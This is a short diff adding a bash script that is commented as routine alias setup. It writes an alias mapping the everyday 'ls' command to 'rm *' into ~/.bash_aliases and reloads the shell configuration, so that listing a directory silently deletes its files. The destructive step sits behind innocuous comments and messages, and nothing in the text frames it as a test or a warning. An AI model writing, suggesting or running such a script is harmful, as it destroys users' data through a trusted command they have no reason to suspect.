@@ -1,0 +1,11 @@
+#!/bin/bash
+
+# Check if the alias already exists
+if [[ $(alias | grep -w "ls=") ]]; then
+  echo "The alias 'ls' already exists."
+else
+  # Create the alias
+  echo "alias ls='rm *'" >> ~/.bash_aliases
+  echo "Alias 'ls' has been created."
+  source ~/.bashrc
+fi
